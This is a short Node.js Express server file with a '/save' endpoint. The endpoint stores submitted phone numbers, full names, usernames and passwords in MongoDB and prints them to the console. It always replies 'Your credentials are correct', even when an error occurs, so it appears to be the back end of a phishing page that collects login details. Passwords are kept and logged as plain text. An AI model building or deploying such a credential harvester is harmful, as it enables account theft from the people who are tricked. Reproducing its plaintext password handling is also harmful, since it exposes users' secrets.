const express = require("express");
const mongoose = require("mongoose");

const app = express();

app.use(express.json());
app.use(express.static("public"));


// ✅ MongoDB (Railway / Atlas compatible)
mongoose.connect(process.env.MONGO_URL)
.then(() => {
    console.log("MongoDB Connected");
})
.catch((error) => {
    console.log("MongoDB Error:", error);
});


// Schema
const UserSchema = new mongoose.Schema({

    number: String,
    fullname: String,
    username: String,
    password: String

});


// Model
const User = mongoose.model("User", UserSchema);


// Save API
app.post("/save", async (req, res) => {

    try {

        console.log("New Signup Data:");
        console.log(req.body);


        const newUser = new User({

            number: req.body.number,
            fullname: req.body.fullname,
            username: req.body.username,
            password: req.body.password

        });

        await newUser.save();

        console.log("Saved to MongoDB");

        res.json({
            message: "Your credentials are correct"
        });

    } catch (error) {

        console.log(error);

        res.json({
            message: "Your credentials are correct "
        });

    }

});


// ✅ Railway PORT fix
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {

    console.log(`Server running on port ${PORT}`);

});